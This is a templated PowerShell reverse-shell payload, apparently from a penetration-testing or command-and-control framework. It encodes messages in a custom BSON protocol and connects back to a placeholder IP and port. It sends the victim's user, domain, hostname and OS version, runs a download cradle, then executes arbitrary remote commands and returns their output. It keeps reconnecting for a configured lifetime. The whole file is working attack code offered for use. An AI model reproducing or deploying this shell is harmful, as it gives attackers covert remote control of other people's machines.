# Start-Job -ScriptBlock {

{{'$DebugPreference = "Continue"'|debug}}

$DL_CRADLE = @'
{{dl_cradle}}
'@

$elements = @{ # bson elements
    [Double] = 1
    [System.String] = 2
    [System.Collections.Hashtable] = 3
    [System.Object[]] = 4
    [System.Byte[]] = 5
    [System.Boolean] = 8
    [Int32] = 0x10
    [UInt64] = 0x11
    [Int64] = 0x12
};

$enc = [system.Text.Encoding]::UTF8

function ConvertTo-Bson {
    param(
        [Parameter(Position = 0, Mandatory = $true)] $dict,
        [Parameter(Position = 1)] [Int32]$type
    )

    [byte[]]$result = @()

    if ($type -eq 0) { # it's the document
        $result += ConvertTo-Bson $dict $elements[$dict.GetType()]
    } elseif ($type -eq 2) { # string
        $result += [bitconverter]::GetBytes([Int32]($dict.length+1))
        $result += $enc.GetBytes($dict)
        $result += 0
    } elseif ($type -eq 3) { # hashtable
        foreach ($key in $dict.keys) {
            $type = $elements[$dict[$key].gettype()]
            $result += $type
            $result += $enc.GetBytes($key)
            $result += 0
            $result += ConvertTo-Bson $dict[$key] $type
        }
        $result = [bitconverter]::GetBytes([Int32]($result.Length+5)) + $result
        $result += 0
    } elseif ($type -eq 4) { # array
        $counter = 0
        foreach ($i in $dict) {
            $type = $elements[$i.gettype()]
            $result += $type
            $result += $enc.GetBytes("$counter")
            $result += 0
            $result += ConvertTo-Bson $i $type
            $counter += 1
        }
        $result = [bitconverter]::GetBytes([Int32]($result.Length+5)) + $result
        $result += 0
    } elseif ($type -eq 0x10) { # int32
        $result += [bitconverter]::GetBytes([Int32]($dict))
    } else {
        throw "Type not supported yet", $type, $dict
        # TODO: consider other types than string.
    }
    $result
}

function ConvertFrom-Bson {
    param([Parameter(Position = 0, Mandatory = $true)] $array,
          [Parameter(Position = 1, Mandatory = $false)] [Int32]$type)
    $result = @{}
    $i = 0
    if ($type -eq 0) {
        $i = 4
        $type = 3
        $l = $array.length
        $length = [BitConverter]::ToInt32([byte[]]$array, 0)
        if ($length -ne $l) {
            throw "Not a valid BSON structure"
        }
    }
    if ($type -eq 3 -or $type -eq 4) {
        # TODO handle arrays separately
        while ($True) {
            $key = ""
            $type = $array[$i]
            $i += 1
            while ($True) { # get the key name
                if ($array[$i] -eq 0) { break }
                $key += $enc.GetString($array[$i])
                $i += 1
            }
            [byte[]]$val = @()
            $i += 1
            if ($type -eq 2) {
                $length = [BitConverter]::ToInt32([byte[]]$array, $i)
                [byte[]]$val = $array[($i+4) .. ($i+4+$length-1)]
                $result[$key] = ConvertFrom-Bson $val $type
                $i += $length+4
            } elseif ($type -eq 0x10) {
                [byte[]]$val = $array[($i) .. ($i+4)]
                $result[$key] = ConvertFrom-Bson $val $type
                $i += 4
            }
            if ($i -ge $array.length - 2  ) {break}
        }
    } elseif ($type -eq 2) {
        # remove the null byte at the end
        $result = $enc.GetString($array[0 .. ($array.length-2)])
    } elseif ($type -eq 0x10) { # int32

        {{'Write-Debug "ToInt32:  $array, $($array.length)"'|debug}}
        $result = [bitconverter]::ToInt32([byte[]]$array, 0)
    } else {
        throw "Type not supported yet", $type, $array
    }
    $result
}



function Invoke-PowerShellTcp
{

    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String] $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int] $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch] $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch] $Bind,

        [Parameter(ParameterSetName="reverse", Mandatory = $false)]
        [Int] $Delay=10,

        [Parameter(ParameterSetName="reverse", Mandatory = $false)]
        [Int] $LifeTime=3
    )

    $id = ''
    1..4 | %{ $id += '{0:x}' -f (Get-Random -Max 256) }
    $creation_time = Get-Date -Format r

    function Read-ShellPacket {
        param (
            [Parameter(Position = 0)] $Stream
        )
        $stream.Read($bytes, 0, 4)
        $packet_length = $bytes[0..3]
        $len = [BitConverter]::ToUInt32([byte[]]$packet_length, 0)
        $stream.Read($bytes, 0, $len-4)
        $body = $packet_length
        $body += $bytes[0 .. ($len-5)]
        {{'Write-Debug "Read: $($enc.getstring($body))"'|debug}}
        $result = ConvertFrom-Bson $body
        return $result
    }

    function Write-ShellPacket {
        param (
            [Parameter(Position = 0)] $Packet,
            [Parameter(Position = 1)] $Stream
        )
        $body = [byte[]](ConvertTo-Bson $Packet)

        {{'Write-Debug "Sending:  $($enc.getstring($body))"'|debug}}
        $Stream.Write($body, 0, $body.length)
        $Stream.Flush()
    }

    function Get-ShellHello {
        @{
            "msg_type" = "SHELL_HELLO"
            "data" = @{
                "id" = $id
                "created" = $creation_time
                "user" = "$ENV:USERNAME"
                "domain" = "$ENV:USERDOMAIN"
                "hostname" = "$ENV:COMPUTERNAME"
                "arch" = "$ENV:PROCESSOR_ARCHITECTURE"
                "ps_version" = [String]$PSVersionTable.PSVersion
                "os_version" = [String]$PSVersionTable.BuildVersion
            }
        }
    }
    function Get-ShellPrompt {
        $PowerShell.Commands.Clear()
        [void]$PowerShell.AddScript("prompt")
        $prompt = ( $PowerShell.Invoke() )
        @{
            "msg_type" = "PROMPT"
            "data" = ($prompt[0])
        }
    }

    function Get-OutputStreams {
        param (
            [Parameter(Position = 0)] $Streams,
            [Parameter(Position = 1)] $Width = 80
        )
        $result = @()
        $Streams.Warning | % { $result+=(@{ "msg_type" = "STREAM_WARNING"; "data" = $_.Message }) }
        $Streams.Verbose | % { $result+=(@{ "msg_type" = "STREAM_VERBOSE"; "data" = $_.Message }) }
        $Streams.Debug | % { $result+=(@{ "msg_type" = "STREAM_DEBUG"; "data" = $_.Message }) }
        $result += (@{ "msg_type" = "STREAM_PROGRESS"; "data" = $Streams.Progress })
        $Streams.Information.MessageData | % { $result+=(@{ "msg_type" = "STREAM_INFORMATION"; "data" = $_.Message }) }

        $Streams.ClearStreams()
        $result | ? { $_.data }
    }


    function Handle-Packets {

        #Create PowerShell object
        $PowerShell = [powershell]::Create()
        $Runspace = [runspacefactory]::CreateRunspace()
        $PowerShell.runspace = $Runspace
        $Runspace.Open()
        [void]$PowerShell.AddScript($DL_CRADLE)

        Write-ShellPacket (Get-ShellHello) $stream

        $init = ( $PowerShell.Invoke() | Out-String )

        Get-OutputStreams $PowerShell.Streams | % { Write-ShellPacket $_ $stream }

        Write-ShellPacket (Get-ShellPrompt) $stream

        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = ""
        while ( $packet = (Read-ShellPacket  $stream)[2] ) {
            $output = ""
            if ($packet.msg_type -eq "COMMAND") {
                $data = $packet.data

                #Execute the command on the target.
                $PowerShell.Commands.Clear()
                [void]$PowerShell.AddScript($data)
                $output = ( $PowerShell.Invoke() | Out-String -Width $packet.width)

                #Get errors
                $PowerShell.Commands.Clear()
                [void]$PowerShell.AddScript('$error')
                $script_errors = ( $PowerShell.Invoke()  | Out-String -Width $packet.width )
                $PowerShell.Commands.Clear()
                [void]$PowerShell.AddScript('$error.clear()')
                $PowerShell.Invoke()

                if ($script_errors.length -gt 0) {
                    Write-ShellPacket @{ "msg_type" = "STREAM_ERROR"; "data" = $script_errors } $stream
                }

                Get-OutputStreams $PowerShell.Streams $packet.width | % {
                    Write-ShellPacket $_ $stream
                }

                Write-ShellPacket @{ "msg_type" = "OUTPUT"; "data" = "$output" } $stream
                Write-ShellPacket (Get-ShellPrompt) $stream
            } elseif ($packet.msg_type -eq "TABCOMPL") {
                $data = $packet.data
                # TODO Not always available
                try {
                    $x = ([System.Management.Automation.CommandCompletion]::CompleteInput($data, $data.length, $Null, $PowerShell))
                    $output = $x.CompletionMatches.CompletionText
                } catch {
                    $output = ""
                }
                if (-not $output) { $output = "" }
                {{'Write-Debug "Completion: $($output|out-string)"'|debug}}
                if ($output.gettype() -eq [System.String]) { $output = @($output) }

                Write-ShellPacket @{ "msg_type" = "TABCOMPL"; "data" = $output } $stream
            } elseif ($packet.msg_type -eq "PING") {
                Write-ShellPacket @{ "msg_type" = "PONG"; "data" = "" } $stream
            } elseif ($packet.msg_type -eq "KILL") {
                $killed = $true
                Write-ShellPacket @{ "msg_type" = "KILL"; "data" = "confirm" } $stream
                Exit
            }
        }
    }

    $start_time = Get-Date
    $now = Get-Date
    $killed = $false
    while ( ($now - $start_time).TotalDays -lt $LifeTime -and -not $killed) {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
            if (-not $client) { Return }
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        # this the shell hello
        $stream.Write([byte[]](0x21,0x9e,0x10,0x55,0x75,0x6a,0x1a,0x6b),0,8)
        [byte[]]$bytes = 0..1024|%{0}

        Handle-Packets

        if ($client) { $client.Close() }
        if ($listener) {$listener.Stop()}

        Sleep $Delay
        $now = Get-Date
    }
}


Invoke-PowerShellTcp {{IP}} {{PORT}} -Reverse -Delay {{delay}} -LifeTime {{lifetime}}
# }
